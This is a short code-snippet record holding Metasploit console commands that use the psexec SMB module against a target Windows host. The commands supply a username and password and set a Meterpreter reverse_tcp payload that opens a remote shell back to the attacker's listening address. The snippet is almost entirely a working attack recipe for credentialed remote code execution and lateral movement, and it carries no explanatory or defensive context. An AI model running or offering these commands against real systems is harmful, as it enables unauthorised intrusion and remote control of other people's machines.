---
id: dc610ddb-208a-43d9-916d-afe38d3684dd
type: code
language: Bash
verified: false
created_at: '2020-07-14T18:14:33.566764+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet dc610ddb

**Language**: Bash

```bash

use exploit/windows/smb/psexec
set rhost $ip
set SMBUser $user
set SMBPass $pass
set payload windows/meterpreter/reverse_tcp
set lhost $localip
exploit

```
